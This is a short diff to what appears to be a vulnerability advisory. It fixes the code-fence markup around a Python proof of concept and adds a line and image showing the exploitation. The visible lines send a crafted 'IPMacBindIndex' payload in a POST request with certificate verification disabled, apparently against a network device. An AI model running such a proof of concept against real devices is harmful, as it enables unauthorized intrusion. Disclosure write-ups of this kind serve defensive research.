@@ -9,7 +9,7 @@ The static analysis is as follows:
 ![image](image/1.png)
 
 POC:
-'''py
+```py
 import requests
 from pwn import *
 
@@ -30,4 +30,6 @@ header={
 
 data1 ='IPMacBindIndex=%s'%payload
 ret = requests.post(url = url ,headers = header,data = data1, verify=False)
-'''
+```
+The exploitation is as shown
+![image](image/1-use.png)
